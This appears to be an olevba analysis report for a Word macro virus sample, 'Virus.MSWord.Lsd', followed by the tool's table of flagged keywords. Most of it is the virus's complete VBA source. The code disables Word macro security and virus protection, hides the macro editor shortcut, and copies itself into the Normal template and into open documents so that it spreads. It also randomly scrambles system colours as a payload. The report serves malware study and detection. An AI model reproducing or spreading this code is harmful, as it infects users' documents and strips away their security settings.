olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Lsd
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSWord.Lsd 
in file: ./Virus.MSWord.Lsd - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Declare Function SetSysColors Lib "user32" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long
Private Sub Document_Open()
' LSD
' By The WalruS 09/00 v1.00

    On Error Resume Next
    
    Randomize

    If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
    
   Select Case Application.Version
    
    Case "9.0"
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
        CommandBars("Macro").Controls("Security...").Enabled = False
    
    Case "8.0"
        Options.VirusProtection = False
        Options.SaveNormalPrompt = False
        Options.ConfirmConversions = False
    End Select
     
    With Application
        .ScreenUpdating = False
        .DisplayStatusBar = False
        .DisplayAlerts = False
    End With
    
    KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "

    Set nor = NormalTemplate.VBProject.vbcomponents(1).CodeModule
    Set doc = ActiveDocument.VBProject.vbcomponents(1).CodeModule

    ChangeHook = Int(Rnd * 2)
    Select Case ChangeHook
    
    Case 0
        Hook = "Private Sub Document_Open()"
        
    Case 1
        Hook = "Private Sub Document_Close()"
    
    End Select
    
    Open "C:\Windows\" & Day(Now) & ".sys" For Output As #1
    Print #1, "Private Declare Function SetSysColors Lib ""user32"" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long"
    Print #1, Hook
    Print #1, VBProject.vbcomponents(1).CodeModule.Lines(3, 110)
    Close #1

    If nor.Lines(3, 1) <> "' LSD" Then
        nor.DeleteLines 1, nor.CountOfLines
        nor.AddFromFile ("C:\Windows\" & Day(Now) & ".sys")
        NormalTemplate.Save
    ElseIf doc.Lines(3, 1) <> "' LSD" Then
        doc.DeleteLines 1, doc.CountOfLines
        doc.AddFromFile ("C:\Windows\" & Day(Now) & ".sys")
    End If

    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "WalruS"
        .Title = "CandyFlippin"
        .Execute
    End With
    
    TimeCheck = Second(Now)
    One = Left(TimeCheck, 1)
    Two = Right(TimeCheck, 1)
    If One = Two Then Call CandyFlip
   
     NormalTemplate.Saved = True
    If ActiveDocument.Saved <> True Then ActiveDocument.Save

End Sub

Private Sub CandyFlip()
    On Error Resume Next
    a = SetSysColors(1, 1, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 2, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 3, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 4, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 5, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 6, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 7, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 8, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 9, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 10, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 11, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 12, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 13, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 14, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 15, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 16, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 17, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 18, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 19, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 20, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 21, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 22, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 23, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 24, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 25, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 26, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 27, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

